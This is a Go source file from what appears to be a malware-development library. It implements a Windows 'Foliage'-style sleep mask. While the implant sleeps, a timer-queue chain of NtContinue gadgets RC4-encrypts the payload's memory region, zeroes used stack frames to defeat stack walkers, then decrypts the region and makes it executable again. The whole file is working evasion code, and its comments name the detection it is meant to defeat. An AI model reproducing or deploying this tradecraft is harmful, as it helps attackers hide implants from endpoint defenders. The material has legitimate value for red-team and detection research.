//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// FoliageStrategy is the L3 strategy: Ekko plus a stack-scrub gadget
// inserted between the encrypt and wait steps. Before the pool thread
// blocks in WaitForSingleObjectEx, it calls RtlFillMemory to zero out
// our own chain's "already-used" shadow frames (gadgets 0 and 1, plus
// the padding region between them). A stack walker that inspects the
// pool thread during the wait then sees zeros above Rsp where the VP
// and SF032 frames would otherwise have left recognizable residue.
//
// Not a full Foliage port: the real Foliage technique (Austin Hudson,
// DeepSleep-style) rewrites the stack with FAKE return frames pointing
// into legitimate KERNEL32/ntdll code so the walk completes and looks
// like normal Windows activity. This is the lighter version — residue
// is zeroed rather than forged. Detection impact: walkers that only
// collect "bytes above Rsp" see nothing; walkers that unwind via
// function-table metadata terminate at the current WaitForSingleObjectEx
// frame (same as Ekko).
//
// Constraints inherit from EkkoStrategy: windows+amd64 only, RC4 cipher,
// single region, runtime.LockOSThread during Cycle, not safe for
// concurrent invocation.
type FoliageStrategy struct {
	// ScrubBytes lets the caller bump/shrink the memset range. 0 uses
	// the default (first two gadget shadow frames + padding = 0x4000).
	ScrubBytes uintptr
}

// foliageMaxSafeScrub is the largest memset range the gadget 2 memset
// call can write without clobbering its own saved-rdi + return address,
// which live at [Rsp-8] and [Rsp] of gadget 2 — i.e. at offsets
// ekkoShadowOffset + 2*ekkoShadowStride and +8 above that. The memset
// starts at ekkoShadowOffset, so the max range that stays strictly below
// the gadget-2 frame is 2 * ekkoShadowStride = 0x4000. Going past that
// (e.g. 3 * stride) zeros out the memset's own return path → AV.
const foliageMaxSafeScrub = 2 * ekkoShadowStride

// foliageDefaultScrubBytes is the default ScrubBytes (covers gadgets 0
// and 1 — the two gadgets that completed before memset ran).
const foliageDefaultScrubBytes = foliageMaxSafeScrub

func (s *FoliageStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/foliage: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/foliage: MVP supports exactly one region")
	}
	region := regions[0]

	scrubBytes := s.ScrubBytes
	if scrubBytes == 0 {
		scrubBytes = foliageDefaultScrubBytes
	}
	if scrubBytes > foliageMaxSafeScrub {
		// Clamp silently: a larger scrub would zero the gadget-2 memset
		// call's own return address and crash the pool thread.
		scrubBytes = foliageMaxSafeScrub
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/foliage: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/foliage: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub — shared with Ekko since the
	// stub only reads them.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	layout, err := newEkkoLayout()
	if err != nil {
		return err
	}
	defer layout.free()

	if api.ProcMemset.Addr() == 0 {
		return errors.New("sleepmask/foliage: ntdll!memset not found")
	}

	api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(layout.ctxMain)))

	var origProtect uint32
	if err := foliageBuildChain(layout, region, key, d, hDummy, &origProtect, scrubBytes); err != nil {
		return err
	}

	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/foliage: CreateTimerQueue: %w", lastErr)
	}
	hQueue := windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	delayMs := uint32(d / time.Millisecond)

	var hTimer windows.Handle
	rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		uintptr(hQueue),
		ntContinueAddr,
		uintptr(unsafe.Pointer(layout.ctxs[0])),
		0, // fire immediately
		0, // one-shot
		0, // WT_EXECUTEDEFAULT
	)
	if rc == 0 {
		return fmt.Errorf("sleepmask/foliage: CreateTimerQueueTimer: %w", cErr)
	}

	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), 0)

	runtime.KeepAlive(key)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

// foliageBuildChain lays out a 7-gadget chain:
//
//	0: VirtualProtect(region, PAGE_READWRITE)           (encrypt-prep)
//	1: SystemFunction032(data, key)                     (RC4 encrypt)
//	2: RtlFillMemory(scratch+0x2000, scrubBytes, 0)     (stack scrub)
//	3: WaitForSingleObjectEx(hDummy, d, FALSE)          (the sleep)
//	4: SystemFunction032(data, key)                     (RC4 decrypt, self-inverse)
//	5: VirtualProtect(region, PAGE_EXECUTE_READ)        (restore)
//	6: resumeStub                                       (SetEvent + spin)
//
// Gadgets 0/1 logic matches Ekko; gadget 2 is the Foliage addition.
// Gadgets 3..6 match Ekko's 2..5 with shifted indices.
func foliageBuildChain(l *ekkoLayout, region Region, key []byte, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32, scrubBytes uintptr) error {
	if region.Size > 0xFFFFFFFF {
		return fmt.Errorf("sleepmask/foliage: region size %d exceeds USTRING.Length max", region.Size)
	}
	if len(key) > ekkoKeyCopyMax {
		return fmt.Errorf("sleepmask/foliage: key size %d exceeds scratch slot", len(key))
	}

	ntContinueAddr := api.ProcNtContinue.Addr()

	// Write 7 trampolines. Each: MOVQ slot[i](RIP),CX; MOVQ $NtContinue,AX; JMP AX.
	for i := 0; i < 7; i++ {
		tr := l.tramp(i)
		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), ekkoTrampStride)
		b[0] = 0x48
		b[1] = 0x8B
		b[2] = 0x0D
		slotAddr := l.slotsBase() + uintptr(i)*8
		rel := int32(int64(slotAddr) - int64(tr+7))
		*(*int32)(unsafe.Pointer(&b[3])) = rel
		b[7] = 0x48
		b[8] = 0xB8
		*(*uint64)(unsafe.Pointer(&b[9])) = uint64(ntContinueAddr)
		b[17] = 0xFF
		b[18] = 0xE0
	}

	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(l.slotsBase())), 7)
	for i := 0; i < 7; i++ {
		slots[i] = uintptr(unsafe.Pointer(l.ctxs[i]))
	}

	keyBuf := unsafe.Slice((*byte)(unsafe.Pointer(l.keyCopy())), len(key))
	copy(keyBuf, key)

	writeUSTR := func(at uintptr, length uint32, buf uintptr) {
		*(*uint32)(unsafe.Pointer(at)) = length
		*(*uint32)(unsafe.Pointer(at + 4)) = length
		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
	}
	dataUSTR := l.ustrDataPool()
	keyUSTR := l.ustrKeyPool()
	writeUSTR(dataUSTR, uint32(region.Size), region.Addr)
	writeUSTR(keyUSTR, uint32(len(key)), l.keyCopy())

	const contextControlInteger = 0x00100003
	setGadget := func(i int, rip uintptr, retTramp uintptr) *api.Context64 {
		c := l.ctxs[i]
		*c = *l.ctxMain
		c.ContextFlags = contextControlInteger
		c.Rip = uint64(rip)
		rsp := l.shadowRsp(i)
		*(*uintptr)(unsafe.Pointer(rsp)) = retTramp
		c.Rsp = uint64(rsp)
		return c
	}

	// Gadget 0: VirtualProtect(addr, size, PAGE_READWRITE, &origProtect)
	c := setGadget(0, api.ProcVirtualProtect.Addr(), l.tramp(1))
	c.Rcx = uint64(region.Addr)
	c.Rdx = uint64(region.Size)
	c.R8 = uint64(windows.PAGE_READWRITE)
	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))

	// Gadget 1: SystemFunction032 — RC4 encrypt
	c = setGadget(1, api.ProcSystemFunction032.Addr(), l.tramp(2))
	c.Rcx = uint64(dataUSTR)
	c.Rdx = uint64(keyUSTR)

	// Gadget 2 (FOLIAGE ADDITION): ntdll!memset(dest=scratch+0x2000, c=0,
	// count=scrubBytes) — zero the first two gadget shadow frames now that
	// they've been used, so a mid-wait stack walker sees clean zeros
	// instead of VP/SF032 residue above Rsp.
	//
	// Uses ntdll!memset rather than RtlFillMemory because Windows' exported
	// RtlFillMemory is implemented as memset() under the hood, so calling
	// it with the documented RtlFillMemory(dest, length, fill) argument
	// order crashes (the real function expects memset's (dest, c, count)).
	c = setGadget(2, api.ProcMemset.Addr(), l.tramp(3))
	c.Rcx = uint64(l.scratch + ekkoShadowOffset)
	c.Rdx = 0 // fill byte (memset's c arg)
	c.R8 = uint64(scrubBytes)

	// Gadget 3: WaitForSingleObjectEx(hDummy, d_ms, FALSE)
	c = setGadget(3, api.ProcWaitForSingleObjectEx.Addr(), l.tramp(4))
	c.Rcx = uint64(hDummy)
	c.Rdx = uint64(d / time.Millisecond)
	c.R8 = 0

	// Gadget 4: SystemFunction032 — RC4 decrypt
	c = setGadget(4, api.ProcSystemFunction032.Addr(), l.tramp(5))
	c.Rcx = uint64(dataUSTR)
	c.Rdx = uint64(keyUSTR)

	// Gadget 5: VirtualProtect(addr, size, PAGE_EXECUTE_READ, &tmp)
	c = setGadget(5, api.ProcVirtualProtect.Addr(), l.tramp(6))
	c.Rcx = uint64(region.Addr)
	c.Rdx = uint64(region.Size)
	c.R8 = uint64(windows.PAGE_EXECUTE_READ)
	c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))

	// Gadget 6: resumeStub — SetEvent + spin.
	cResume := l.ctxs[6]
	*cResume = *l.ctxMain
	cResume.ContextFlags = contextControlInteger
	cResume.Rip = uint64(resumeStubAddr())
	cResume.Rsp = uint64(l.shadowRsp(6))
	*(*uintptr)(unsafe.Pointer(l.shadowRsp(6))) = 0

	return nil
}
